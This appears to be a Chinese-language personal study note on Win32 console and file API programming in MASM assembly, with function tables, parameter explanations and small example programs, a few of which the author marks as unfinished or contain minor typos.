布尔值 (TRUE 或 FALSE) BYTE BYTE 8 位无符号整数 CHAR BYTE 8 位 Windows ANSI 字符 COLORREF DWORD 作为颜色值的 32 位数值 DWORD DWORD 32 位无符号整数 HANDLE DWORD 对象句柄 HFILE DWORD 用 OpenFile 打开的文件的句柄 INT SDWORD 32 位有符号整数 LONG SDWORD 32 位有符号整数 LPARAM DWORD 消息参数，由窗口过程和回调函数使用 LPCSTR PTR BYTE 32 位指针，指向由 8 位 Windows (ANSI)字符组成的空字节结束的字符串常量 LPCVOID DWORD 指向任何类型的常量 LPSTR PTR BYTE 32 位指针，指向由 8 位 Windows (ANSI) 字符组成的空字节结束的字符串 LPCTSTR PTR WORD 32 位指针，指向对 Unicode 和双字节字符集可移植的字符串常量 LPTSTR PTR WORD 32 位指针，指向对 Unicode 和双字节字符集可移植的字符串 LPVOID DWORD 32 位指针，指向未指定类 LRESULT DWORD 窗口过程和回调函数返回的 32 位数值 SIZE_T DWORD 一个指针可以指向的最大字节数 UNIT DWORD 32 位无符号整数 WNDPROC DWORD 32 位指针，指向窗口过程 WORD WORD 16 位无符号整数 WPARAM DWORD 作为参数传递给窗口过程或回调函数的 32 位数值 函数一览表下表为所有 Win32 控制台函数的一览表。在 www.msdn.microsoft.com 上可以找到 MSDN 库中每个函数的完整描述。 提示：Win32 API 函数不保存 EAX、EBX、ECX 和 EDX，因此程序员需自己完成这些寄存器的入栈和出栈操作。 所以你会发现,一个函数使用,你的寄存器会发生一些改变 函数 描述 AllocConsole 为调用进程分配一个新控制台 CreateConsoleScreenBuffer 创建控制台屏幕缓冲区 ExitProcess 结束进程及其所有线程 FillConsoleOutputAttribute 为指定数量的字符单元格设置文本和背景颜色属性 FillConsoleOutputCharacter 按指定次数将一个字符写入屏幕缓冲区 FlushConsoleInputBuffer 刷新控制台输入缓冲区 FreeConsole 将主调进程与其控制台分离 GenerateConsoleCtrlEvent 向控制台进程组发送指定信号，这些进程组共享与主调进程关联的控制台 GetConsoleCP 获取与主调进程关联的控制台使用的输入代码页 GetConsoleCursorInfo 获取指定控制台屏幕缓冲区光标大小和可见性的信息 GetConsoleMode 获取控制台输入缓冲区的当前输入模式或控制台屏幕缓冲区的当前输出模式 GetConsoleOutputCP 获取与主调进程关联的控制台使用的输出代码页 GetConsoleScreenBufferInfo 获取指定控制台屏幕缓冲区信息 GetConsoleTitle 获取当前控制台窗口的标题栏字符串 GetConsoleWindow 获取与主调进程关联的控制台使用的窗口句柄 GetLargestConsoleWindowSize 获取控制台窗口最大可能的大小 GetNumberOfConsoleInputEvents 获取控制台输入缓冲区中未读输入记录的个数 GetNumberOfConsoleMouseButtons 获取当前控制台使用的鼠标按钮数 GetStdHandle 获取标准输入、标准输出或标准错误设备的句柄 HandlerRoutine 与 SetConsoleCtrlHandler 函数一起使用的应用程序定义的函数 PeekConsoleInput 从指定控制台输入缓冲区读取数据，且不从缓冲区删除该数据 ReadConsole 从控制台输入缓冲区读取并删除输入字符 ReadConsoleInput 从控制台输入缓冲区读取并删除该数据 ReadConsoleOutput 从控制台屏幕缓冲区的矩形字符单元格区域读取字符和颜色属性数据 ReadConsoleOutputAttribute 从控制台屏幕缓冲区的连续单元格复制指定数量的前景和背景颜色属性 ReadConsoleOutputCharacter 从控制台屏幕缓冲区的连续单元格复制若干字符 ScrollConsoleScreenBuffer 移动屏幕缓冲区内的一个数据块 SetConsoleActiveScreenBuffer 设置指定屏幕缓冲区为当前显示的控制台屏幕缓冲区 SetConsoleCP 设置主调过程的控制台输入代码页 SetConsoleCtrlHandler 为主调过程从处理函数列表中添加或删除应用程序定义的 HandlerRoutine SetConsoleCursorInfo 设置指定控制台屏幕缓冲区光标的大小和可见度 SetConsoleCursorPosition 设置光标在指定控制台屏幕缓冲区中的位置 SetConsoleMode 设置控制台输入缓冲区的输入模式或者控制台屏幕缓冲区的输出模式 SetConsoleOntputCP 设置主调过程的控制台输出代码页 SetConsoleScreenBufferSize 修改指定控制台屏幕缓冲区的大小 SetConsoleTextAttribute 设置写入屏幕缓冲区的字符的前景（文本）和背景颜色属性 SetConsoleTitle 为当前控制台窗口设置标题栏字符串 SetConsoleWindowInfo 设置控制台屏幕缓冲区窗口当前的大小和位置 SetStdHandle 设置标准输入、输出和标准错误设备的句柄. WriteConsole 向由当前光标位置标识开始的控制台屏幕缓冲区写一个字符串 WriteConsoleInput 直接向控制台输入缓冲区写数据 WriteConsoleOutput 向控制台屏幕缓冲区内指定字符单元格的矩形块写字符和颜色属性数据 WriteConsoleOutputAttribute 向控制台屏幕缓冲区的连续单元格复制一组前景和背景颜色属性 WriteConsoleOutputCharacter 向控制台屏幕缓冲区的连续单元格复制一组字符 句柄他只是用来表示各种资源的编号 书上说了这么一句话,不是很理解 加入你把句柄&#x3D;11给了应用程序,应用程序不知道他是什么 你把句柄&#x3D;11给了windows,windows就知道去查找哪个窗口 可能他说了句柄也有分类,线程局部,窗口句柄,文件句柄…….. 他还说,如果以前有10个窗口,你给了windows11号窗口 当原来的10个窗口关闭,留下5个,那么你的11号窗口就变了6号窗口 他说我们不需要关系句柄的值,用就对了 模块一个模块代表了&#x3D;&#x3D;运行中&#x3D;&#x3D;的exe或者dll文件,用来代表这个文件中所有的&#x3D;&#x3D;代码与资源&#x3D;&#x3D; 每个不同的模块都有唯一的的模块句柄来标识,&#x3D;&#x3D;利用这个句柄我们可以访问文件的资源…&#x3D;&#x3D; 很多的API函数都要用到都要用到模块的句柄,以便利用程序的各种资源 在win32上,模块句柄的值&#x3D;&#x3D;程序在内存中载入的启示地址 Messagebox A&#x2F;WMessagebox一般默认为MessageboxA MessageboxA一般用于ANSI标准,这个标准你之前也是遇到过的,不能显示中文, ANSI规定字符占一个字节,我们就用MessageboxA Unicode码规定字符占2个字节,我们就用MessageboxW 12345MessageBoxA PROTO, hWnd:DWORD, ;窗口句柄（可以为空） lpText:PTR BYTE, ;字符串，对话框内 lpCaption:PTR BYTE, ;字符串，对话框标题 uType:DWORD ;内容和行为 hwnd 基于控制台的应用程序可以将 hWnd 设置为空，表示该消息框没有相关的包含窗口或父窗口。 lpText 消息框内容的指针 lpCaption 消息框标题的指针 uType 指定对话框的内容和行为 内容和行为uType 参数包含的位图整数组合了三种选项：显示按钮、图标和默认按钮选择。几种可能的按钮组合如下： MB_OK MB_OKCANCEL MB_YESNO MB_YESNOCANCEL MB_RETRYCANCEL MB_ABORTRETRYIGNORE MB_CANCELTRYCONTINUE 默认按钮可以选择按钮作为用户点击 Enter 键时的自动选项。选项包括 MB_DEFBUTTON1（默认）、MB_DEFBUTTON2、MB_DEFBUTTON3 和 MB_DEFBUTTON4。 按钮从左到右，从 1 开始编号。 图标有四个图标可用。有时多个常数会产生相同的图标： 停止符：MB_ICONSTOP. MB_ICONHAND 或 MB_ICONERROR 问号（?）：MB_ICONQUESTION 信息符（i）：MB_ICONINFORMATION、MB_ICONASTERISK 感叹号（!）：MB_ICONEXCLAMATION、MB_ICONWARNING 返回值如果 MessageBoxA 失败，则返回零； 否则，它将返回一个整数以表示用户在关闭对话框时点击的按钮。 选项包括 IDABORT、IDCANCEL、IDCONTINUE、IDIGNORE、IDNO、IDOK、IDRETRY、IDTRYAGAIN，以及 IDYES。 。 如果想要消息框窗口浮动于桌面所有其他窗口之上，就在传递的最后一个参数（uType 参数）值上添加 MB_SYSTEMMODAL 选项 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tcaptionW BYTE &quot;Warning&quot;,0warningMsg BYTE &quot;The current operation may take years &quot; BYTE &quot;to complete.&quot;,0captionQ BYTE &quot;Question&quot;,0questionMsg BYTE &quot;A matching user account was not found.&quot; BYTE 0dh,0ah,&quot;Do you wish to continue?&quot;,0 captionC BYTE &quot;Information&quot;,0infoMsg BYTE &quot;Select Yes to save a backup file &quot; BYTE &quot;before continuing,&quot;,0dh,0ah BYTE &quot;or click Cancel to stop the operation&quot;,0captionH BYTE &quot;Cannot View User List&quot;,0haltMsg BYTE &quot;This operation not supported by your &quot; BYTE &quot;user account.&quot;,0 ;--------------------------------------------------------.codestart: ; 显示感叹号图标和 OK 按钮 INVOKE MessageBoxA, NULL, ADDR warningMsg, ADDR captionW, MB_OK + MB_ICONEXCLAMATION ; 显示问号图标和 Yes/No 按钮 INVOKE MessageBoxA, NULL, ADDR questionMsg, ADDR captionQ, MB_YESNO + MB_ICONQUESTION ; 解释用户点击的按钮 cmp eax,IDYES ; YES button clicked? ; 显示信息图标和 Yes/No/Cancel 按钮 INVOKE MessageBoxA, NULL, ADDR infoMsg, ADDR captionC, MB_YESNOCANCEL + MB_ICONINFORMATION + MB_DEFBUTTON2 ; 显示停止图标和 OK 按钮 INVOKE MessageBoxA, NULL, ADDR haltMsg, ADDR captionH, MB_OK + MB_ICONSTOP invoke\tExitProcess,NULLend start;----------------------------------------------------- 窗口输入ReadConsole 读取输入函数 ReadConsole 为读取文本输入并将其送入缓冲区提供了便捷的方法。其原型如下所示： 123456ReadConsole PROTO,hConsoleInput: HANDLE z ;输入句柄lpBuffer:PTR BYTE, ;缓冲区指针nNumberOfCharsToRead:DWORD, ;读取的字符数lpNumberOfCharsRead:PTR DWORD, ;指向读取字节数的指针lpReserved:DWORD ;未使用 hConsoleInput 是函数 GetStdHandle 返回的可用控制台输入句柄。 lpBuffer 是字符数组的偏移量。 nNumberOfCharsToRead 是一个 32 位整数，指明读取的最大字符数。 lpNumberOfCharsRead 是一个允许函数填充的双字指针，当函数返回时，字符数的计数值将被放入缓冲区。 最后一个参数未使用，因此传递的值为 0。 在调用 ReadConsole 时，输入缓冲区还要包含两个额外的字节用来保存行结束字符。 如果希望输入缓冲区里是空字节结束字符串，则用空字节来代替内容为 ODh 的字节。Irvine32.lib 的过程 ReadString 就是这样操作的。 注意：Win32 API 函数不会保存 EAX、EBX、ECX 和 EDX 寄存器。 例子 12345678910111213141516171819202122232425262728293031323334include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tmax = 80Input_Buff BYTE max DUP(?),0,0An_Input_Handle HANDLE ?len DWORD ?captionC byte &quot;Gh0st&quot;,0;--------------------------------------------------------.codestart: ; 获取标准输入句柄\tINVOKE\tGetStdHandle, STD_INPUT_HANDLE\tmov\tAn_Input_Handle,eax ; 等待用户输入\tINVOKE\tReadConsole, An_Input_Handle\t, ADDR Input_Buff, max, ADDR len, 0\tINVOKE MessageBoxA, NULL, ADDR Input_Buff,\tADDR captionC, MB_YESNOCANCEL + MB_ICONINFORMATION + MB_DEFBUTTON2\tinvoke\tExitProcess,NULLend start;----------------------------------------------------- 它并没有等待我的输入,我根本就没啥输入的地方,以后慢慢解决 解决办法就是修改编译方式 1LINK_FLAG = /subsystem:console 输入 12I am here !然后回车 得到长度13&#x3D;2+11 IDA-data 1aIAmHere db &#x27;I am here !&#x27;,0Dh,0Ah,0 所以会有11个 GetLastError&#x2F;FormatMessage 获取错误消息GetLastError没有参数 FormatMessage 12345678FormatMessage PROTO, ;格式化消息 dwFlags:DWORD, ;格式化选项 lpSource:DWORD, ;消息定义的位置 dwMsgID:DWORD, ;消息标识符 dwLanguageID:DWORD, ;语言标识符 lpBuffer:PTR BYTE, ;缓冲区接收字符串指针 nSize:DWORD, ;缓冲区大小 va_list: DWORD ;参数列表指针 下面简要列出了最常用的参数值。除了 lpBuffer 是输出参数外，其他都是输入参数 dwFlags 保存格式化选项的双字整数，包括如何解释参数 lpSource。 它规定怎样处理换行，以及格式化输出行的最大宽度. 建议值为 FORMAT_MESSAGE_ALLOCATE_BUFFER 和 FORMAT_MESSAGE_FROM_SYSTEM。 lpSource 消息定义位置的指针。若按照建议值设置 dwFlags，则 lpSource 设置为 NULL(0)。 dwMsgID 调用 GetLastError 后返回的双字整数。 dwLanguageID 语言标识符。若将其设置为 0，则消息为语言无关，否则将对应于用户的默认语言环境。 lpBuffer( 输出参数 ) 接收空字节结束消息字符串的缓冲区指针。如果使用了 FORMAT_MESSAGE_ALLOCATE_BUFFER 选项，则会自动分配缓冲区。 nSize 用于指定一个缓冲区来保存消息字符串。如果 dwFlags 使用了上述建议选项，则该参数可以设置为 0。 va_list 数组指针，该数组包含了可以插入到格式化消息的值。由于没有格式化错误消息，这个参数可以为 NULL(0)。 例子 1234567891011121314151617181920212223242526272829include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data messageId DWORD ?\tpErrorMsg DWORD ? ;指向错误消息;--------------------------------------------------------.codestart: .code\tcall GetLastError\tmov messageId,eax\tINVOKE\tFormatMessage, FORMAT_MESSAGE_ALLOCATE_BUFFER + FORMAT_MESSAGE_FROM_SYSTEM, NULL, messageId, 0, ADDR pErrorMsg, 0, NULL\tINVOKE LocalFree, pErrorMsg invoke\tExitProcess,NULLend start;----------------------------------------------------- ReadChar&#x2F;ReadKey 获取当前按键 ReadChar：等待键盘输入一个 ASCII 字符，并用 AL 返回该字符。 ReadKey：过程执行无等待键盘检查。 如果控制台输入缓冲区中没有等待的按键，则ZF &#x3D; 1。 如果发现有按键，则ZF&#x3D;0且 AL 等于零或 ASCII 码。EAX 和 EDX 的高 16 位被覆盖。 ​ 如果 AL 等于 0，那么用户可能按下了特殊键（功能键、光标箭头等）。 ​ AH 寄存器为键盘扫描码。DX 为虚拟键\t码，EBX 为键盘控制键状态信息。 下表为控制键值列表。调用 ReadKey 之后，可以用 TEST 指令检查各种键值。 值 含义 值 含义 CAPSLOCK_ON CAPSLOCK 指示灯亮 RIGHT_ALT_PRESSED 右 ALT 键被按下 ENHANCED_KEY 被按下增强的 RIGHT_CTRL_PRESSED 右 CTRL 键被按下 LEFT_ALT_PRESSED 该键是左 ALT 键 SCROLLLOCL_ON SCROLLLOCK 指示灯亮 LEFT_CTRL_PRESSED 左 CTRL 键被按下 SHIFT_PRESSED SHIFT 键被按下 NUMLOCK_ON NUMLOCK 指示灯亮 GetKeyState 获取当前按下的键通过测试单个键盘按键可以发现当前按下的是哪个键。方法是调用 API 函数 GetKeyState。 1GetKeyState PROTO, nVirtKey:DWORD 向该函数传递如下表所示的虚拟键值。测试程序必须按照同一个表来测试 EAX 里面的返回值。 按键 虚拟键符号 EAX 中被测试的位 NumLock VK_NUMLOCK 0 Scroll Lock VK_SCROLL 0 Left Shift VK_LSHIFT 15 Right Shift VK_tRSHIFT 15 Left Ctrl VK_LCONTROL 15 Right Ctrl VK_RCONTROL 15 Left Menu VK_LMENU 15 Right Menu VK_RMENU 15 窗口输出WriteConsole 输出函数 WriteConsole 在控制台窗口的当前光标所在位置写一个字符串，并将光标留着字符串末尾右边的字符位置上。 123456WriteConsole PROTO, hConsoleOutput:HANDLE, lpBuffer:PTR BYTE, nNumberOfCharsToWrite:DWORD, lpNumberOfCharsWritten:PTR DWORD, lpReserved:DWORD hConsoleOutput 是控制台输出流句柄； lpBuffer 是输出字符数组的指针； nNumberOfCharsToWrite 是数组长度； lpNumberOfCharsWritten 是函数返回时实际输出字符数量的整数指针。 最后一个参数未使用，因此将其设置为 0。 例子 123456789101112131415161718192021222324252627282930313233include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tendl EQU &lt;0dh,0ah&gt;b_str label byte\tBYTE &quot;hello I am here&quot;,0Ah\tBYTE &quot;I have no friends &quot;,0Ah\tBYTE &quot;This is my friend.&quot;, endllen\tDWORD ($-b_str)A_Output_Handle\tHANDLE 0 ; 标准输出设备句柄how_much\tDWORD ? ; 输出字节数;--------------------------------------------------------.codestart: INVOKE GetStdHandle, STD_OUTPUT_HANDLE mov A_Output_Handle,eax INVOKE WriteConsole, A_Output_Handle, ; 控制台输出句柄 ADDR b_str, ; 字符串指针 len, ; 字符长度 ADDR how_much, ; 返回输出字节数 0 ; 未使用\tinvoke\tExitProcess,NULLend start;----------------------------------------------------- WriteConsoleOutputCharacter123456WriteConsoleOutputCharacter PROTO, hConsoleOutput:HANDLE, ;控制台输出句柄 lpCharacter :PTR BYTE, ;缓冲区指针 nLength: DWORD, ;缓冲区大小 dwWriteCoord: COORD, ;第一个单元格的坐标 lpNumberOfCharsWritten: PTR DWORD ;输出计数器 下面是一个失败的例子 还要修改 123456789101112131415161718192021222324252627282930313233include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tendl EQU &lt;0dh,0ah&gt;b_str label byte\tBYTE &quot;hello I am here&quot;,0Ah\tBYTE &quot;I have no friends &quot;,0Ah\tBYTE &quot;This is my friend.&quot;, endllen\tDWORD ($-b_str)A_Output_Handle\tHANDLE 0 ; 标准输出设备句柄how_much\tDWORD ? ; 输出字节数dwWriteCoord\tCOORD\t&lt;0,0&gt;;--------------------------------------------------------.codestart: INVOKE GetStdHandle, STD_OUTPUT_HANDLE mov A_Output_Handle,eax INVOKE WriteConsoleOutputCharacter, A_Output_Handle, ; 控制台输出句柄 ADDR b_str, ; 字符串指针 len, ; 字符长度 dwWriteCoord, ; 返回输出字节数 ADDR how_much ; 未使用\tinvoke\tExitProcess,NULLend start;----------------------------------------------------- 文件 处理CreateFile函数 CreateFile 可以创建一个新文件或者打开一个已有文件。 如果调用成功，函数返回打开文件的句柄； 否则，返回特殊常数 INVALID_HANDLE_VALUEO 原型如下： 12345678CreateFile PROTO, ;创建新文件 lpFilename:PTR BYTE, ;文件名指针 dwDesiredAccess:DWORD, ;访问模式 dwShareMode:DWORD, ;共享模式 lpSecurityAttributes:DWORD, ;安全属性指针 dwCreationDisposition:DWORD, ;文件创建选项 dwFlagsAndAttributes:DWORD, ;文件属性 hTemplateFile:DWORD ;文件模板句柄 下表对参数进行了说明。如果函数调用失败则返回值为零。 参数 说明 lpFileName 指向一个0空字节结束字符串，该串为部分或全部合格的文件名 例如（C:\\path\\filename） dwDesiredAccess 指定文件访问方式（读或写） dwShareMode 控制多个程序对打开文件的访问能力 lpSecurityAttributes 指向安全结构，该结构控制安全权限 dwCreationDisposition 指定文件存在或不存在时的操作 dwFlagsAndAttributes 包含位标志指定文件属性，如存档、加密、隐藏、普通、系统和临时 hTemplateFile 包含一个可选的文件模板句柄，该文件为已创建的文件提供文件属性和扩展属性；如果不使用该参数，就将其设置为 0 关于上面说到的参数 dwDesiredAccess 参数 dwDesiredAccess 允许指定对文件进行读访问、写访问、读&#x2F;写访问，或者设备查询访问。 可以从下表列出的值中选择，也可以从表中未列出的更多特定标志值选择。 值 含义 0 为对象指定设备查询访问。应用程序可以查询设备属性而无需访问设备，也可以检查文件是否存在 GENERIC_READ 读访问。可以从文件中读取数据，文件指针可以移动。与 GENERIC_WRITE 一起使用为读&#x2F;写访问 GENERIC_WRITE 写访问。可以向文件中写入数据，文件指针可以移动。与 GENERIC_READ 一起使用为读&#x2F;写访问 dwCreationDisposition 参数 dwCreationDisposition 指定当文件存在或不存在时应采取怎样的操作。可从下表中选择一个值。 值 含义 CREATE_NEW 创建一个新文件。要求将参数 dwDesiredAccess 设置为 GENERIC_WRITE。如果文件已经存在，则函数调用失败 CREATE_ALWAYS 创建一个新文件。如果文件已存在，则函数会覆盖原文件，清除现有属性，并合并文件 属性与预定义的常数 FILE_ATTRIBUTES_ARCHIVE 中属性参数指定的标志。要求将参数 dwDesiredAccess 设置为 GENERIC WRITE OPEN_EXISTING 打开文件。如果文件不存在，则函数调用失败。可用于读取和&#x2F;或写入文件 OPEN_ALWAYS 如果文件存在，则打开文件。如果不存在，则函数创建文件，就好像CreateDisposition 的值为 CREATE NEW TRUNCATE_EXISTING 打开文件。一旦打开，文件将被截断，使其大小为零。要求将参数 dwDesiredAccess 设置为 GENERIC_WRITE。如果文件不存在，则函数调用失败 下表列出了参数 dwFlagsAndAttributes 比较常用的值。 允许任意属性组合，除了 FILE_ATTRIBUTE_NORMAL 会被其他 所有属性覆盖。 这些值能映射为 2 的幂，因此可以用汇编时 OR 运算符或 + 运算符将它们组 合为一个参数： 例如 12FILE_ATTRIBUTE_HIDDEN OR FILE_ATTRIBUTE_READONLYFILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_READONLY 属性 含义 FILE_ATTRIBUTE_ARCHIVE 文件存档。应用程序使用这个属性标记文件以便备份或移动 FILE_ATTRIBUTE_HIDDEN 文件隐藏。不包含在普通目录列表中 FILE_ATTRIBUTE_NORMAL 文件没有其他属性设置。该属性只在单独使用时有效 FILE_ATTRIBUTE_READONLY 文件只读。应用程序可以读文件但不能写或删除文件 FILE_ATTRIBUTE_TEMPORARY 文件被用于临时存储 打开并读取（输入）已存在文件： 12345678INVOKE CreateFile, ADDR filename, ;文件名指针 GENERIC_READ, ;读文件 DO_NOT_SHARE, ;共享模式 NULL, ;安全属性指针 OPEN_EXISTING, ;打开已存在文件 FILE_ATTRIBUTE_NORMALA ;普通文件属性 0 ;未使用 打开并写入（输出）已存在文件。 文件打开后，可以通过写入覆盖当前数据， 或者将文件指针移到末尾，向文件添加新数据（参见11.1.6节的SetFilePointer）： 12345678INVOKE CreateFile, ADDR filename, GENERIC_WRITEZ, ;写文件 DO_NOT_SHARE, ;共享模式 NULL, ;安全属性指针 OPEN_EXISTIN, ;文件必须存在 FILE_ATTRIBUTE_NORMAL, 0 ;未使用 创建有普通属性的新文件，并删除所有已存在的同名文件： 12345678INVOKE CreateFile, ADDR filename, GENERIC_WRITE, ;写文件 DO _NOT_SHARE, NULL, CREATE_ALWAYS, ;覆盖已存在的文件 FILE_ATTRIBUTE_NORMAL, 0 若文件不存在，则创建文件；否则打开并输出现有文件： 12345678INVOKE CreateFile, ADDR filename, GENERIC_WRITE, ;写文件 DO_NOT_SHARE, NULL, CREATE_NEW, ;不删除已存在文件 FILE_ATTRIBUTE_NORMAL, 0 CloseHandle 函数 CloseHandle 关闭一个打开的对象句柄。其原型如下 12CloseHandle PROTO, hObject: HANDLE ;对象句柄 ReadFile函数 ReadFile 从输入文件中读取文本。其原型如下： 123456ReadFile PROTO, hFile:HANDLE, ;输入句柄 lpBuffer:PTR BYTE, ;缓冲区指针 nNumberOfBytesToRead:DWORD, ;读取的字节数 lpNumberOfBytesRead:PTR DWORD, ;实际读出的 字节数 lpOverlapped:PTR DWORD ;异步信息指针 其中： hFile 是由 CreateFile 返回的打开文件的句柄； lpBuffer 指向的缓冲区接收从该文件读取的数据； nNumberOfBytesToRead 定义从该文件读取的最大字节数； lpNumberOfBytesRead 指向的整数为函数返回时实际读取的字节数； lpOverlapped 应被设置为 NULL(0)。若函数调用失败，则返回值为零。 如果对同一个打开文件的句柄进行多次调用，那么 ReadFile 就会记住最后一次读取的位置，并从这个位置开始读。换句话说，函数有一个内部指针指向文件内的当前位置。 WriteFile函数 WriteFile 用输出句柄向文件写入数据。 句柄可以是屏幕缓冲区句柄， 也可以是分配给文本文件的句柄。 函数从文件内部位置指针所指向的位置开始写数据。 写操作完成后，文件位置指针按照实际写入的字节数进行调整。函数原型如下： 123456WriteFile PROTO, hFile:HANDLE, ;输出句柄 lpBuffer:PTR BYTE, ;缓冲区指针 nNumberOfBytesToWrite:DWORD, ;缓冲区大小 lpNumberOfBytesWritten:PTR DWORD, ;写入字节数 lpOverlapped:PTR DWORD ;异步信息指针 中： hFile 是已打开文件的句柄； lpBuffer 指向的缓冲区包含了写入到文件的数据； nNumberOfBytesToWrite 指定向文件写入多少字节； lpNumberOfBytesWritten 指向的整数为函数执行后实际写入的字节数； 若为同步操作，则 lpOverlapped 应被设置为 NULL。若函数调用失败，则返回值为零。 SetFilePointer函数 SetFilePointer 移动打开文件的位置指针。该函数可以用于向文件添加数据，或是执行随机访问记录处理： 12345SetFilePointer PROTO, hFile:HANDLE, ;文件句柄 lpDistanceToMove:SDWORD, ;指针移动 字节数 lpDistanceToMoveHigh:PTR SDWORD, ;指针移动字节数，高双字 dwMoveMethod:DWORD ;起点 lpDistance移动距离本身为 64 位有符号整数值，分为两个部分： lpDistanceToMove：低 32 位 lpDistanceToMoveHigh：含有高 32 位的变量指针 dwMoveMode 指定文件指针移动的起点，选择项为 3 个预定义符号：FILE_BEGIN、FILE_CURRENT 和 FILE_END。 若函数调用失败，则返回值为零。 如果 lpDistanceToMoveHigh 为空，则只用 lpDistanceToMove 的值来移动文件指针。例如，下面的代码准备添加到一个文件末尾： 12345INVOKE SetFilePointer, fileHandle, ;文件句柄 0, ;距离低32位 0, ;距离高32位 FILE_END ;移动模式 控制台窗口操作下列函数影响的是控制台窗口及其相对于屏幕缓冲区的位置： SetConsoleWindowInfo：设置控制台窗口相对于屏幕缓冲区的大小和位置。 GetConsoleScreenBufferInfo：返回（还包括其他一些信息）控制台窗口相对于屏幕缓冲区的矩形坐标。 SetConsoleCursorPosition：将光标设置在屏幕缓冲区内的任何位置；如果区域不可见，则移动控制台窗口直到光标可见。 ScrollConsoleScreenBuffer：移动屏幕缓冲区中的一些或全部文本，本函数会影响控制台窗口显示的文本。 SetConsoleTitle改变控制台窗口的标题 1234.data.titleStr BYTE &quot;Console title&quot;, 0.codeINVOKE SetConsoleTitle, ADDR titleStr GetConsoleScreenBufferInfo函数 GetConsoleScreenBufferInfo 返回控制台窗口的当前状态信息。它有两个参数：控制台屏幕的句柄和指向该函数填充的结构的指针： 123GetConsoleScreenBufferInfo PROTO, hConsoleOutput:HANDLE, lpConsoleScreenBufferInfo:PTR CONSOLE_SCREEN_BUFFER_INFO 函数示例调用如下所示： 123456.dataconsoleInfo CONSOLE_SCREEN_BUFFER_INFO &lt;&gt;outHandle HANDLE ?.codeINVOKE GetConsoleScreenBufferInfo, outHandle, ADDR consoleInfo CONSOLE_SCREEN_BUFFER_INFO 结构如下： 1234567CONSOLE_SCREEN_BUFFER_INFO STRUCT dwSize COORD &lt;&gt; dwCursorPosition COORD &lt;&gt; wAttributes WORD ? srWindow SMALL_RECT &lt;&gt; dwMaximumWindowSize COORD &lt;&gt;CONSOLE_SCREEN_BUFFER_INFO ENDS dwSize 按字符行列数返回屏幕缓冲区大小。 dwCursorPosition 返回光标的位置。这两个字段都是 COORD 结构。 wAttributes 返回字符的前景色和背景色，字符由诸如 WriteConsole 和 WriteFile 等函数写到控制台。 srWindow 返回控制台窗口相对于屏幕缓冲区的坐标。 dwMaximumWindowSize 以当前屏幕缓冲区的大小、字体和视频显示大小为基础，返回控制台窗口的最大尺寸。 SetConsoleWindowInfo函数 SetConsoleWindowInfo 可以设置控制台窗口相对于其屏幕缓冲区的大小和位置。函数原型如下： 1234SetConsoleWindowInfo PROTO, hConsoleOutput:HANDLE, ;屏幕缓冲区句柄 bAbsolute:DWORD, ;坐标类型 lpConsoleWindow:PTR SMALL_RECT ;矩形窗口指针 bAbsolute 说明如何使用结构中由 lpConsoleWindow 指出的坐标。 如果 bAbsolute 为真，则坐标定义控制台窗口新的左上角和右下角。 如果 bAbsolute 为假，则坐标与当前窗口坐标相加。 什么叫真真假假????写一个1,他也是32位的BOOL值 例子 12345678910111213141516171819202122232425262728293031323334353637383940414243include Dqx.inc; Appending to a File (AppendFile.asm); This program appends text to an existing file..datamessage BYTE &quot;: This line of text was written &quot; BYTE &quot;I am Dqx_Gh0st!&quot;,0dh,0ahmessageSize\tDWORD ($-message)outHandle\tHANDLE 0 ; 标准输出句柄bytesWritten\tDWORD ? ; 已写入字节数lineNum DWORD 0windowRect\tSMALL_RECT &lt;0,0,60,11&gt; ; 上，下，左，右.codestart:\tINVOKE GetStdHandle, 